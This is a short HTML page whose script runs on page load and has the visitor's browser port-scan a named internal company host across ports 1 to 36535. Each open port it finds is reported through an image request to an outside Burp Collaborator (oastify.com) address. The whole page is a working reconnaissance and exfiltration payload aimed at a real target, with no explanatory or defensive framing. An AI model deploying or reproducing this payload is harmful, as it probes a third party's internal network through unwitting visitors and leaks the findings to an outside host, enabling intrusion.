<!DOCTYPE html>
<html>
<head>
    <title>Port Scan and Ping Burp Collaborator</title>
    <script type="text/javascript">
        async function scanPort(host, port) {
            try {
                let url = `https://${host}:${port}`;
                await fetch(url, { mode: 'no-cors' });
                console.log(`Port ${port} is open`);
                sendPing(port);
                return port;
            } catch (error) {
                return null; // Port is closed
            }
        }

        async function scanPorts(host, ports) {
            let openPorts = [];
            for (let port of ports) {
                let result = await scanPort(host, port);
                if (result) {
                    openPorts.push(result);
                }
            }
            return openPorts;
        }

        function sendPing(port) {
            let collaboratorUrl = 'https://3swjmsd1aowlois3j9h7ucg2etkk8awz.oastify.com';
            let pingUrl = `${collaboratorUrl}?port=${port}`;
            let img = new Image();
            img.src = pingUrl;
            console.log(`Ping sent to ${pingUrl}`);
        }

        document.addEventListener("DOMContentLoaded", function() {
            let host = 'chat-internal.snapchat.com'; // Replace with your target host

            // Generate an array of ports from 1 to 36535
            let ports = [];
            for (let i = 1; i <= 36535; i++) {
                ports.push(i);
            }

            scanPorts(host, ports).then(openPorts => {
                console.log("Open ports:", openPorts);
            });
        });
    </script>
</head>
<body>
    <p>Scanning ports and pinging Burp Collaborator...</p>
</body>
</html>
